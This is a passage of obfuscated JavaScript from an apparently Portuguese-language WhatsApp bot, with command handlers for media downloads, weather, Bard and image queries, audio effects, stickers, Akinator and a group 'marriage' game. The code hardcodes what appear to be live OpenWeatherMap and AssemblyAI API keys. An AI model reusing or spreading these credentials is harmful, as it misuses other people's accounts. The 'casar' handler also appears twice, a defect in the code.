                  externalAdReply: _0x2bcdca
                };
                const _0x5f2b3c = {
                  audio: _0x2e1bd2,
                  mimetype: "audio/mpeg",
                  contextInfo: _0x355f05,
                  quoted: _0xa6b34
                };
                _0x263319.sendMessage(_0x4f1071, _0x5f2b3c);
              } catch (_0x1cacf1) {
                if (String(_0x1cacf1).includes("invalid json response body at")) {
                  console.log("A api caiu ou não foi possível executar esta ação., espere retornar");
                } else {}
              }
              break;
            case "kwai":
              try {
                if (!_0x1d6557.includes("kwai-video.com")) {
                  return _0x403602("Ops, link do kwai invalido, só baixo vídeos do " + _0x3dec88 + " com link");
                }
                response2 = await fetch(SITE_JEFF_APIS + "/download/kwai?url=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                _0x105f0a = await response2.json();
                if (_0x105f0a && _0x105f0a.length > 0) {
                  const _0xecab60 = _0x105f0a[0].video;
                  const _0xdbcf44 = {
                    url: "" + _0xecab60,
                    caption: "Aqui está seu vídeo 🥵"
                  };
                  const _0x5426a8 = {
                    video: _0xdbcf44
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x5426a8);
                } else {
                  _0x403602("Não foi possível obter o URL do vídeo.");
                }
              } catch (_0x232083) {
                console.log(_0x232083);
                _0x403602("Deu Erro na API. 🤓");
              }
              break;
            case "lerqr":
              if (_0x13c612 && !_0x302296.message.videoMessage || _0x10f925) {
                post = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                imagem = await downloadContentFromMessage(post, "image");
                base64 = Buffer.from([]);
                for await (const _0x542ab8 of imagem) {
                  base64 = Buffer.concat([base64, _0x542ab8]);
                }
                _0x403602(enviar.espere);
                _0x2722a9 = await upload(base64);
                qr = await fetchJson(SITE_JEFF_APIS + "/api/lerqrcode?query=" + _0x2722a9 + "&apikey=" + _0x512d5e);
                if (qr.status === false) {
                  ;
                  _0x403602("𝐑𝐄𝐒𝐔𝐋𝐓𝐀𝐃𝐎: " + qr.resultado);
                } else {
                  _0x403602("Erro ao chamar a API.");
                }
              } else {
                _0x403602("Selecione um qrcode para mim ler.");
              }
              break;
            case "imagine":
              try {
                if (!_0x1d6557) {
                  return _0x403602("O que você deseja criar amiguinho?");
                }
                _0x403602("Criando uma imagem a partir de seu questionamento, aguarde...");
                const _0x2358fd = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, {
                  image: {
                    url: SITE_JEFF_APIS + "/api/ia/midjourney?query=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e
                  }
                }, _0x2358fd).catch(() => {
                  return _0x403602(mess.error());
                });
              } catch {
                _0x403602("error");
              }
              break;
            case "bard":
              if (!_0x1d6557) {
                return _0x403602("Digite o que quer perguntar ao bard, exemplo: " + _0x1d93be + "bard como fazer arroz");
              }
              const _0xca00b1 = {
                quoted: _0x302296
              };
              var {
                key: _0x3808b5
              } = await _0x263319.sendMessage(_0x4f1071, {
                text: "Aguarde, criando / pesquisando sobre o que está perguntando ou pedindo."
              }, _0xca00b1);
              bard = await fetchJson(SITE_JEFF_APIS + "/api/ia/gbard?query=" + encodeURIComponent(_0x2e320b.slice(6)) + "&apikey=" + _0x512d5e);
              bard1 = bard.resultado;
              const _0x310804 = {
                text: "" + bard1,
                edit: _0x3808b5
              };
              await _0x263319.sendMessage(_0x4f1071, _0x310804);
              break;
            case "bardvoz":
              try {
                const _0xf88e2b = require("./armor/funcoes/gtts")("pt-br");
                if (!_0x1d6557) {
                  return _0x403602("Faça uma pergunta, exemplo:\n\n*" + (_0x1d93be + _0x3dec88) + " Quantos anos para o plástico se decompor.*");
                }
                setTimeout(async () => {
                  await _0x263319.sendPresenceUpdate("recording", _0x4f1071);
                }, 3000);
                _0x403602("Aguarde, criando / pesquisando sobre o que esta perguntando ou pedindo");
                ABC = await fetchJson(SITE_JEFF_APIS + "/api/ia/gbard?query=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x1ffe50 = getRandom(".mp3");
                const _0x37b8be = getRandom(".ogg");
                _0xf88e2b.save(_0x1ffe50, ABC.resultado, async () => {
                  exec("ffmpeg -i " + _0x1ffe50 + " -ar 48000 -vn -c:a libopus " + _0x37b8be, async _0x5cdd54 => {
                    fs.unlinkSync(_0x1ffe50);
                    if (_0x5cdd54) {
                      return _0x403602("Houve um erro no processamento da sua solicitação. Tente novamente mais tarde e talvez, quem sabe, eu possa atender ao seu desejo.");
                    }
                    const _0x569da6 = {
                      quoted: _0x302296
                    };
                    await _0x263319.sendMessage(_0x4f1071, {
                      audio: fs.readFileSync(_0x37b8be),
                      mimetype: "audio/mp4",
                      ptt: true
                    }, _0x569da6);
                    fs.unlinkSync(_0x37b8be);
                  });
                });
              } catch (_0x2f0924) {}
              break;
            case "clima":
              if (_0x40e45c.length < 1) {
                return _0x403602("*Esta faltando a cidade Ex:*\n " + (_0x1d93be + _0x3dec88) + " Maceió");
              }
              try {
                const _0x2e4c6f = await axios.get("https://api.openweathermap.org/data/2.5/weather?q=" + encodeURIComponent(_0x2e320b.slice(7)) + "&appid=548b8266f19038cfd1f6d6f007d8bc58&units=metric&lang=pt_br");
                if (!_0x2e4c6f.data) {
                  return _0x403602("Erro ao obter dados do clima.");
                } else if (_0x2e4c6f.data.cod === 404) {
                  return _0x403602("Cidade não encontrada. Verifique se o nome está correto.");
                } else if (_0x2e4c6f.data.cod !== 200) {
                  return _0x403602("Erro na solicitação: " + _0x2e4c6f.data.message);
                }
                const _0x4aaf35 = moment.tz("America/Sao_Paulo").format("HH:mm:ss");
                const _0x5e72ce = "╭━『⛈️ 𝐓𝐄𝐌𝐏𝐎/𝐂𝐋𝐈𝐌𝐀 ⌛』━╮\n    │ೋ❀🌡️ 𝘈𝘨𝘰𝘳𝘢⧽ " + _0x2e4c6f.data.main.temp.toFixed(1) + "ºC\n    │ೋ❀🏙️ 𝘊𝘪𝘥𝘢𝘥𝘦⧽ " + _0x2e4c6f.data.name + "\n    │ೋ❀🔺 𝘛𝘦𝘮𝘱. 𝘔𝘢́𝘹𝘪𝘮𝘢⧽ " + _0x2e4c6f.data.main.temp_max.toFixed(1) + "°C\n    │ೋ❀🔻 𝘛𝘦𝘮𝘱. 𝘔𝘪́𝘯𝘪𝘮𝘢⧽ " + _0x2e4c6f.data.main.temp_min.toFixed(1) + "°C\n    │ೋ❀🌦️ 𝘊𝘭𝘪𝘮𝘢⧽ " + _0x2e4c6f.data.weather[0].description + "\n    │ೋ❀💧 𝘜𝘮𝘪𝘥𝘢𝘥𝘦 𝘥𝘰 𝘈𝘳⧽ " + _0x2e4c6f.data.main.humidity + "%\n    │ೋ❀🌬️ 𝘝𝘦𝘯𝘵𝘰𝘴⧽ " + _0x2e4c6f.data.wind.speed + "  \n    ╰━━━━━━━━━━ ❬ " + _0x4aaf35 + "  ❭";
                const _0x34bbfc = {
                  text: _0x5e72ce
                };
                const _0x36fc21 = {
                  mentionedJid: _0x5e72ce
                };
                const _0x2cd08f = {
                  quoted: _0x302296,
                  contextInfo: _0x36fc21
                };
                await _0x263319.sendMessage(_0x4f1071, _0x34bbfc, _0x2cd08f);
              } catch (_0x2ca993) {
                console.error(_0x2ca993);
                return _0x403602("Erro - cidade não encontrada!");
              }
              break;
            case "shazam":
              {
                if (!_0x6aebb1 && !_0x5760e9) {
                  return _0x403602("Envie um áudio ou marque um vídeo com " + (_0x1d93be + _0x3dec88) + " para que eu possa detectar o nome da música.");
                }
                const _0x527405 = {
                  text: "⏳",
                  key: _0x302296.key
                };
                const _0x5ad492 = {
                  react: _0x527405
                };
                _0x263319.sendMessage(_0x4f1071, _0x5ad492);
                try {
                  let _0x4d6946;
                  let _0x85f327;
                  let _0x478395;
                  if (_0x6aebb1) {
                    _0x4d6946 = await getFileBuffer(_0x302296.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage, "audio");
                    _0x85f327 = Buffer.from(_0x4d6946).toString("base64");
                  } else {
                    _0x4d6946 = await getFileBuffer(_0x302296.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage, "video");
                    _0x85f327 = Buffer.from(_0x4d6946).toString("base64");
                  }
                  let _0x535e5b = await arcloud(_0x85f327);
                  console.log(_0x535e5b);
                  _0x478395 = _0x535e5b[0].titulo;
                  ABC = await fetchJson(SITE_JEFF_APIS + "/api/ytsrc?q=" + _0x478395 + "&apikey=" + _0x512d5e);
                  if (!ABC.resultado || ABC.resultado.length === 0) {
                    throw new Error("Nenhum resultado encontrado para o vídeo.");
                    const _0x13acfa = {
                      text: "❌",
                      key: _0x302296.key
                    };
                    const _0x4db225 = {
                      react: _0x13acfa
                    };
                    _0x263319.sendMessage(_0x4f1071, _0x4db225);
                  }
                  const _0x364376 = {
                    text: "✅",
                    key: _0x302296.key
                  };
                  const _0x1540f9 = {
                    react: _0x364376
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x1540f9);
                  const _0x21c6b0 = "📄 Título: " + ABC.resultado[0].title + "\n👀 *Visualização*: " + ABC.resultado[0].views + "\n👤 *Canal*: " + ABC.resultado[0].author.name + "\n⌛️ *Duração*: " + ABC.resultado[0].timestamp + "\n 🔗 *Link*: " + ABC.resultado[0].url + "\n💬 *Descrição*: " + ABC.resultado[0].description;
                  const _0x8606e0 = await getBuffer(ABC.resultado[0].image);
                  const _0x4ade2c = {
                    image: _0x8606e0,
                    caption: _0x21c6b0
                  };
                  const _0x39183f = {
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x4ade2c, _0x39183f);
                  const _0x95bc30 = {
                    url: SITE_JEFF_APIS + "/api/dl/ytaudio2?url=" + ABC.resultado[0].url + "&apikey=" + _0x512d5e
                  };
                  const _0x5cd894 = {
                    audio: _0x95bc30,
                    mimetype: "audio/mpeg"
                  };
                  const _0x36db4d = {
                    quoted: _0x302296
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x5cd894, _0x36db4d);
                } catch (_0x1f8ebd) {
                  console.error(_0x1f8ebd);
                  const _0x2e9c3e = {
                    text: "❌",
                    key: _0x302296.key
                  };
                  const _0x2e5532 = {
                    react: _0x2e9c3e
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x2e5532);
                  return _0x403602("🥲 Desculpe, não consegui encontrar a música!");
                }
              }
              break;
            case "audiomeme":
            case "playmeme":
              try {
                const _0x595d4c = require("node-fetch");
                if (!_0x1d6557) {
                  return _0x403602("❌ Erro! Comando correto: " + (_0x1d93be + _0x3dec88) + " < Nome do Áudio >.");
                }
                _0x403602("Certíssimo! Procurando áudio... Espere!");
                const _0x21c686 = SITE_JEFF_APIS + "/api/tuna?query=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e;
                const _0x5dd222 = await _0x595d4c(_0x21c686);
                const _0x44d4cd = await _0x5dd222.json();
                if (_0x44d4cd && _0x44d4cd.resultado && _0x44d4cd.resultado.length > 0) {
                  const _0x2c30e4 = _0x44d4cd.resultado[0];
                  const _0x36afc7 = {
                    url: _0x2c30e4
                  };
                  const _0x58a7a5 = {
                    audio: _0x36afc7,
                    mimetype: "audio/mpeg"
                  };
                  const _0x5cc1c7 = {
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x58a7a5, _0x5cc1c7);
                } else {
                  return _0x403602("*❌ Nenhum áudio encontrado. Tente novamente com outro termo.*");
                }
              } catch (_0x52cbfa) {
                console.error("Erro durante o envio de áudio:", _0x52cbfa);
                return _0x403602("*❌ Comando com erro! Tente novamente depois.*");
              }
              break;
            case "akinator":
              try {
                currentAkinator = akinator.find(_0x27e8b6 => _0x27e8b6.id === _0x4f1071);
                if (currentAkinator && currentAkinator.jogador === _0x32e455) {
                  return _0x403602("*- Atenção:* você já iniciou uma sessão do Akinator.");
                }
                existingSession = akinator.find(_0x37fdf8 => JSON.stringify(_0x37fdf8).includes(_0x4f1071) && akinator.length > 0 && Number(_0x37fdf8.dia) === Number(moment.tz("America/Sao_Paulo").format("DD")));
                if (existingSession) {
                  return _0x5b6fe5("*- Atenção:* *@" + _0x32e455.split("@")[0] + "*, o jogador: *@" + existingSession.jogador.split("@")[0] + "* já iniciou a partida, espere ele(a) terminar...");
                }
                jogo.now = true;
                if (akinator.length > 0 && Number(akinator[0].dia) !== Number(moment.tz("America/Sao_Paulo").format("DD"))) {
                  akinator.shift();
                }
                if (!currentAkinator) {
                  _0x403602("*⏤͟͟͞͞ ꦿAKINATOR* 🧙🏼‍♂️⃤\n\nAtenção " + _0x55a6ac + ", irei iniciar o jogo do akinator... Responda com \nSim\nNão\nNão sei\nProvavelmente Sim\nProvavelmente não\n\n Para reiniciar: " + _0x1d93be + "resetaki\n\n(Boa Sorte!)");
                  akidata = moment.tz("America/Sao_Paulo").format("DD");
                  let _0x3eaa40 = async () => {
                    const _0x183ad5 = {
                      region: "pt",
                      childMode: false,
                      proxy: undefined
                    };
                    global.aki = new Aki(_0x183ad5);
                    await aki.start();
                  };
                  await _0x3eaa40();
                  jogo.now = false;
                  jogo.jogador = _0x32e455;
                  const _0x414646 = {
                    id: _0x4f1071,
                    jogador: _0x32e455,
                    termino: 0,
                    dia: akidata
                  };
                  akinator.push(_0x414646);
                  fs.writeFileSync(akinatorjson, JSON.stringify(akinator, null, 2));
                  _0x403602("*⏤͟͟͞͞ ꦿAKINATOR* 🧙🏼‍♂️\n\n🔮⃤" + aki.question);
                }
              } catch (_0x2bcbec) {
                console.log(_0x2bcbec);
                _0x403602("Ocorreu um erro " + _0x3dec88 + ". Em caso do erro continuar, erro no sistema, descupa.\n\nEquipe " + NomeDoBot + " vai trabalhar para ajustar.");
              }
              break;
            case "akiresetar":
            case "resetaraki":
            case "resetaki":
              try {
                nosei = _0xd20756 ? 0 : akinator.findIndex(_0xc20d47 => _0xc20d47.id === _0x4f1071);
                if (nosei !== -1 && (akinator[nosei].jogador === _0x32e455 || _0x150e9e || _0xd20756)) {
                  jogo.now = true;
                  akinator.splice(nosei, 1);
                  fs.writeFileSync(akinatorjson, JSON.stringify(akinator, null, 2));
                  _0x403602("*- Aviso:* O jogo foi resetado com sucesso, a sessão foi deletada.");
                } else {
                  _0x403602("*- Aviso:* Somente admins do grupo ou o jogador que iniciou o jogo podem finalizar a sessão!");
                }
              } catch (_0x6e1709) {
                _0x403602("*- Aviso:* Nenhuma sessão em andamento.");
              }
              break;
            case "figu_flork":
            case "figu_emoji":
            case "figu_aleatoria":
            case "figu_memes":
            case "figu_anime":
            case "figu_coreana":
            case "figu_bebe":
            case "figu_desenho":
            case "figu_animais":
            case "figu_engracada":
            case "figu_raiva":
            case "figu_roblox":
              if (!_0x1d6557) {
                return _0x403602("Por favor, informe a quantidade de figurinhas que deseja que eu envie!");
              }
              if (!Number(_0x1d6557.trim()) || Number(_0x1d6557.trim()) > 5) {
                return _0x403602("Digite a quantidade de figurinhas desejada, sendo no máximo 5.");
              }
              async function _0x5a4ea0() {
                const _0x28ddfb = {
                  url: SITE_JEFF_APIS + "/sticker/" + _0x3dec88 + "?apikey=" + _0x512d5e
                };
                const _0x5c3ef7 = {
                  sticker: _0x28ddfb
                };
                _0x263319.sendMessage(_0x4f1071, _0x5c3ef7);
              }
              for (let _0x4d6911 = 0; _0x4d6911 < _0x1d6557; _0x4d6911++) {
                await sleep(680);
                _0x5a4ea0();
              }
              break;
            case "stickera":
              if (!_0x1d6557) {
                return _0x403602("Por favor, informe a quantidade de figurinhas que deseja que eu envie!");
              }
              if (!Number(_0x1d6557.trim()) || Number(_0x1d6557.trim()) > 10) {
                return _0x403602("Digite a quantidade de figurinhas desejada, sendo no máximo 10.");
              }
              async function _0x42a0c7() {
                const _0x3cc912 = {
                  url: SITE_JEFF_APIS + "/api/stickera?apikey=" + _0x512d5e
                };
                const _0x5e5a5e = {
                  sticker: _0x3cc912
                };
                _0x263319.sendMessage(_0x4f1071, _0x5e5a5e);
              }
              for (let _0x3ddfa8 = 0; _0x3ddfa8 < _0x1d6557; _0x3ddfa8++) {
                await sleep(680);
                _0x42a0c7();
              }
              break;
            case "transcrever":
              if (!_0x6aebb1) {
                return _0x403602("Mencione o áudio para eu transcrever.");
              }
              const _0x6a8daa = {
                text: "⏳",
                key: _0x302296.key
              };
              const _0x5158d9 = {
                react: _0x6a8daa
              };
              _0x263319.sendMessage(_0x4f1071, _0x5158d9);
              if (_0x302296.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage.fileLength > 2100000) {
                return _0x403602("Este áudio excede 2MB e não pode ser processado.");
              }
              let _0x497e70 = await getFileBuffer(_0x302296.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage, "audio");
              const _0x2986cb = {
                quoted: _0x302296
              };
              let {
                keyy: _0x5b635a
              } = await _0x263319.sendMessage(_0x4f1071, {
                text: "*_AGUARDE A TRANSCRIÇÃO DO ÁUDIO_* ⏱️"
              }, _0x2986cb);
              fs.writeFileSync("./Media/AUDIOTOTEXT/totext-" + _0x32e455 + ".mp3", _0x497e70);
              const _0x896e74 = new assemblyAI({
                apiKey: "4af2d448692e4f2985dedfc7aa652c6c"
              });
              const _0x2ecc1c = {
                audio_url: "./Media/AUDIOTOTEXT/totext-" + _0x32e455 + ".mp3",
                language_code: "pt"
              };
              const _0x28fc68 = await _0x896e74.transcripts.create(_0x2ecc1c);
              if (_0x28fc68.status === "error") {
                return _0x403602("Erro ao transcrever este áudio.");
              }
              if (_0x28fc68.words.length == 0) {
                return _0x403602("Não foi possível realizar a transcrição.");
              }
              const _0x21b385 = {
                text: "❐ *TRANSCRIÇÃO DO ÁUDIO* 📃\n\n──────────\n❐ *Total de palavras: " + _0x28fc68.words.length + "*\n\n❐ 📝 *[" + _0x28fc68.text + "]*\n─────────❐",
                quoted: _0x302296
              };
              await _0x263319.sendMessage(_0x4f1071, _0x21b385);
              const _0x4ff949 = {
                text: "✅",
                key: _0x302296.key
              };
              const _0x4837b0 = {
                react: _0x4ff949
              };
              await _0x263319.sendMessage(_0x4f1071, _0x4837b0);
              DLT_FL("./Media/AUDIOTOTEXT/totext-" + _0x32e455 + ".mp3");
              break;
            case "eco":
              if (!_0x6aebb1) {
                return _0x403602("Marque um áudio");
              }
              _0x403602("Aguarde...");
              const _0x292bca = _0x6aebb1 ? _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : _0x302296.message.audioMessage;
              const _0x13c830 = getRandom("." + (await getExtension(_0x292bca.mimetype)));
              const _0x490948 = getRandom(".mp3");
              const _0x37e254 = await getFileBuffer(_0x292bca, "audio");
              fs.writeFileSync(_0x13c830, _0x37e254);
              exec("ffmpeg -i " + _0x13c830 + " -af \"aecho=0.8:0.9:1000:0.3\" " + _0x490948, (_0x2ebcf5, _0x4f5145, _0x3a395b) => {
                fs.unlinkSync(_0x13c830);
                if (_0x2ebcf5) {
                  return _0x403602("Erro!");
                }
                const _0x855093 = fs.readFileSync(_0x490948);
                const _0x3fd3e3 = {
                  audio: _0x855093,
                  mimetype: "audio/mp4",
                  ptt: true
                };
                const _0x139c0e = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, _0x3fd3e3, _0x139c0e);
                fs.unlinkSync(_0x490948);
              });
              break;
            case "vibrato":
              if (!_0x6aebb1) {
                return _0x403602("Marque um áudio");
              }
              _0x403602("Aguarde...");
              const _0x1d8988 = _0x6aebb1 ? _0x302296.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : _0x302296.message.audioMessage;
              const _0x2d2648 = getRandom("." + (await getExtension(_0x1d8988.mimetype)));
              const _0x2ec876 = getRandom(".mp3");
              const _0x3c7fe0 = await getFileBuffer(_0x1d8988, "audio");
              fs.writeFileSync(_0x2d2648, _0x3c7fe0);
              exec("ffmpeg -i " + _0x2d2648 + " -af vibrato=f=13:d=0.5000 " + _0x2ec876, (_0x1342a0, _0x358c10, _0x50e887) => {
                fs.unlinkSync(_0x2d2648);
                if (_0x1342a0) {
                  return _0x403602("Erro!");
                }
                const _0x33af55 = fs.readFileSync(_0x2ec876);
                const _0x1e101f = {
                  audio: _0x33af55,
                  mimetype: "audio/mp4",
                  ptt: true
                };
                const _0x491aa2 = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, _0x1e101f, _0x491aa2);
                fs.unlinkSync(_0x2ec876);
              });
              break;
            case "casar":
            case "casacomigo":
              setTimeout(() => {
                _0x1b86ad(_0x4f1071, "💍");
              }, 300);
              if (!_0xd20756) {
                return _0x403602("Só em Grupos.");
              }
              if (!_0x23cd8e) {
                return _0x403602("É necessario que algum admin ative o modo brincadeira.\n\nExemplo: " + _0x1d93be + "modobrincadeira 1");
              }
              if (!_0x1dcf0a) {
                return _0x403602("Marque a pessoa que você quer pedir em casamento, a mensagem ou o @");
              }
              if (!_0x2a5ff3 && _0x1dcf0a.includes(_0x2dd81a)) {
                return _0x403602("Não é possível pedir o bot em casamento...");
              }
              if (JSON.stringify(casamento2).includes(_0x1dcf0a)) {
                L1 = casamento2.map(_0x60291a => _0x60291a.id).indexOf(_0x1dcf0a);
                L2 = casamento1.map(_0xa9f7d8 => _0xa9f7d8.usu1).indexOf(casamento2[L1].pedido + "@s.whatsapp.net");
                if (casamento1[L2].casados == false) {
                  casamento1.splice(L2, 1);
                  fs.writeFileSync("./DADOS/casamento/casamento1.json", JSON.stringify(casamento1, null, 2));
                }
                casamento2.splice(L1, 1);
                fs.writeFileSync("./DADOS/casamento/casamento2.json", JSON.stringify(casamento2, null, 2));
              }
              if (JSON.stringify(casamento1).includes(_0x1dcf0a) && casamento1[casamento1.map(_0x2485c8 => _0x2485c8.usu1).indexOf(_0x1dcf0a)].casados == false) {
                return _0x403602("Essa pessoa já pediu alguém em casamento... Sinto muito " + _0x55a6ac + " 😕");
              }
              if (JSON.stringify(casamento1).includes(_0x1dcf0a) && casamento1[casamento1.map(_0x34c4ad => _0x34c4ad.usu1).indexOf(_0x1dcf0a)].casados == true) {
                _0x403602("Não será possível pedir essa pessoa em casamento... Pois a mesma é casada 🌚");
                return _0x263319.sendMessage(casamento1[casamento1.map(_0x2dc84c => _0x2dc84c.usu1).indexOf(_0x1dcf0a)].usu2 + "@s.whatsapp.net", {
                  text: "Oh, @" + _0x32e455.split("@")[0] + " tá querendo roubar teu cônjuge no grupo " + _0x471350 + " kkkk avalia isso aí 👻",
                  mentions: [casamento1[casamento1.map(_0x16cf13 => _0x16cf13.usu1).indexOf(_0x1dcf0a)].usu2 + "@s.whatsapp.net", _0x32e455]
                });
              }
              if (JSON.stringify(casamento1).includes(_0x32e455) && casamento1[casamento1.map(_0x5c6ed8 => _0x5c6ed8.usu1).indexOf(_0x32e455)].casados == false) {
                return _0x5b6fe5("Você já pediu para se casar com o/a @" + casamento1[casamento1.map(_0xfd587d => _0xfd587d.usu1).indexOf(_0x32e455)].usu2 + "... Aguarde retorno ou use " + _0x1d93be + "cancelar");
              }
              if (JSON.stringify(casamento1).includes(_0x32e455) && casamento1[casamento1.map(_0x127689 => _0x127689.usu1).indexOf(_0x32e455)].casados == true) {
                _0x5b6fe5("Você já está casado (a) com o/a @" + casamento1[casamento1.map(_0x57551a => _0x57551a.usu1).indexOf(_0x32e455)].usu2 + " 🤨");
                return _0x263319.sendMessage(casamento1[casamento1.map(_0x3b2d21 => _0x3b2d21.usu1).indexOf(_0x32e455)].usu2 + "@s.whatsapp.net", {
                  text: "Aí, queria falar nada não, mas... O/a @" + _0x32e455.split("@")[0] + " tá pedindo o/a @" + _0x32e455.split("@")[0] + " em casamento no grupo " + _0x471350 + " ksksk avalia esse chifre aí 👻",
                  mentions: [_0x32e455, _0x1dcf0a]
                });
              }
              casamento1.push({
                usu1: _0x32e455,
                usu2: _0x1dcf0a.split("@")[0],
                casados: false,
                idgp: _0x4f1071,
                contS: 0,
                contM: 0,
                hora: 0,
                minuto: 0,
                segundo: 0,
                dia: 0,
                contD1: 0,
                contD2: 0,
                mês: 0,
                contM1: 0,
                contM2: 0,
                ano: 200,
                contA1: 0,
                contA2: 0
              });
              fs.writeFileSync("./DADOS/casamento/casamento1.json", JSON.stringify(casamento1, null, 2));
              casamento2.push({
                id: _0x1dcf0a,
                pedido: _0x32e455.split("@")[0],
                idgp: _0x4f1071
              });
              fs.writeFileSync("./DADOS/casamento/casamento2.json", JSON.stringify(casamento2));
              const _0x1fdfd4 = {
                audio: {
                  url: "./DADOS/casamento/shipo.m4a"
                },
                mimetype: "audio/mp4",
                ptt: true
              };
              const _0x353157 = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, _0x1fdfd4, _0x353157);
              _0x263319.sendMessage(_0x4f1071, {
                video: {
                  url: "https://telegra.ph/file/75499a498bfe8b03fab0e.mp4"
                },
                gifPlayback: true,
                caption: _0x55a6ac + " *" + _0x6965b0.toUpperCase() + "*\n⇒ @" + _0x1dcf0a.split("@")[0] + "\n\n_" + _0x55a6ac + " está te pedindo em casamento... Digite『 s 』caso queira aceitar, ou『 n 』caso queira recusar_ 🫴🏽💍\n\nPara Cancelar o Pedido \nUse: " + _0x1d93be + "cancelar",
                mentions: [_0x1dcf0a]
              });
              break;
            case "divorcio":
            case "divorciar":
              if (!JSON.stringify(casamento1).includes(_0x32e455)) {
                return _0x403602("Você não é casado (a) com ninguém... Sinto muito 😕");
              }
              if (Number(_0x40e45c[0]) === 1) {
                D1 = casamento1.map(_0x499498 => _0x499498.usu1).indexOf(_0x32e455);
                D2 = casamento1.map(_0x163c57 => _0x163c57.usu1).indexOf(casamento1[D1].usu2 + "@s.whatsapp.net");
                if (casamento1[D1].casados == false) {
                  return _0x403602("Você não está casado (a), ainda... Mas pode usar " + _0x1d93be + "cancelar");
                }
                casamento1.splice(D2, 1);
                fs.writeFileSync("./DADOS/casamento/casamento1.json", JSON.stringify(casamento1, null, 2));
                casamento1.splice(D1, 1);
                fs.writeFileSync("./DADOS/casamento/casamento1.json", JSON.stringify(casamento1, null, 2));
                _0x403602("Divórcio efetuado com sucesso 💔");
              } else {
                _0x403602("Tem crtz disso " + _0x55a6ac + " ? Se estiver mesmo disposto a terminar com seu cônjuge, use " + (_0x1d93be + _0x3dec88) + " 1");
              }
              break;
            case "casar":
            case "casacomigo":
              setTimeout(() => {
                _0x1b86ad(_0x4f1071, "💍");
              }, 300);
              if (!_0xd20756) {
                return _0x403602("Só em Grupos.");
              }
              if (!_0x23cd8e) {
                return _0x403602("É necessario que algum admin ative o modo brincadeira.\n\nExemplo: " + _0x1d93be + "modobrincadeira 1");
              }
              if (!_0x1dcf0a) {
                return _0x403602("Marque a pessoa que você quer pedir em casamento, a mensagem ou o @");
              }
              if (!_0x2a5ff3 && _0x1dcf0a.includes(_0x2dd81a)) {
                return _0x403602("Não é possível pedir o bot em casamento...");
              }
              if (JSON.stringify(casamento2).includes(_0x1dcf0a)) {
                L1 = casamento2.map(_0x8264c1 => _0x8264c1.id).indexOf(_0x1dcf0a);
                L2 = casamento1.map(_0x5826f3 => _0x5826f3.usu1).indexOf(casamento2[L1].pedido + "@s.whatsapp.net");
                if (casamento1[L2].casados == false) {
                  casamento1.splice(L2, 1);
                  fs.writeFileSync("./DADOS/casamento/casamento1.json", JSON.stringify(casamento1, null, 2));
                }
                casamento2.splice(L1, 1);
                fs.writeFileSync("./DADOS/casamento/casamento2.json", JSON.stringify(casamento2, null, 2));
              }
              if (JSON.stringify(casamento1).includes(_0x1dcf0a) && casamento1[casamento1.map(_0x51a247 => _0x51a247.usu1).indexOf(_0x1dcf0a)].casados == false) {
                return _0x403602("Essa pessoa já pediu alguém em casamento... Sinto muito " + _0x55a6ac + " 😕");
              }
              if (JSON.stringify(casamento1).includes(_0x1dcf0a) && casamento1[casamento1.map(_0x33c621 => _0x33c621.usu1).indexOf(_0x1dcf0a)].casados == true) {
                _0x403602("Não será possível pedir essa pessoa em casamento... Pois a mesma é casada 🌚");
                return _0x263319.sendMessage(casamento1[casamento1.map(_0x57b13d => _0x57b13d.usu1).indexOf(_0x1dcf0a)].usu2 + "@s.whatsapp.net", {
                  text: "Oh, @" + _0x32e455.split("@")[0] + " tá querendo roubar teu cônjuge no grupo " + _0x471350 + " kkkk avalia isso aí 👻",
                  mentions: [casamento1[casamento1.map(_0x2c1094 => _0x2c1094.usu1).indexOf(_0x1dcf0a)].usu2 + "@s.whatsapp.net", _0x32e455]
                });
              }
              if (JSON.stringify(casamento1).includes(_0x32e455) && casamento1[casamento1.map(_0x258dfd => _0x258dfd.usu1).indexOf(_0x32e455)].casados == false) {
                return _0x5b6fe5("Você já pediu para se casar com o/a @" + casamento1[casamento1.map(_0x398a86 => _0x398a86.usu1).indexOf(_0x32e455)].usu2 + "... Aguarde retorno ou use " + _0x1d93be + "cancelar");
              }
              if (JSON.stringify(casamento1).includes(_0x32e455) && casamento1[casamento1.map(_0x539399 => _0x539399.usu1).indexOf(_0x32e455)].casados == true) {
                _0x5b6fe5("Você já está casado (a) com o/a @" + casamento1[casamento1.map(_0x32d50b => _0x32d50b.usu1).indexOf(_0x32e455)].usu2 + " 🤨");
                return _0x263319.sendMessage(casamento1[casamento1.map(_0x1f1ff3 => _0x1f1ff3.usu1).indexOf(_0x32e455)].usu2 + "@s.whatsapp.net", {
                  text: "Aí, queria falar nada não, mas... O/a @" + _0x32e455.split("@")[0] + " tá pedindo o/a @" + _0x32e455.split("@")[0] + " em casamento no grupo " + _0x471350 + " ksksk avalia esse chifre aí 👻",
                  mentions: [_0x32e455, _0x1dcf0a]
                });
              }
              casamento1.push({
                usu1: _0x32e455,
                usu2: _0x1dcf0a.split("@")[0],
                casados: false,
                idgp: _0x4f1071,
                contS: 0,
                contM: 0,
                hora: 0,
                minuto: 0,
                segundo: 0,
                dia: 0,
                contD1: 0,
                contD2: 0,
                mês: 0,
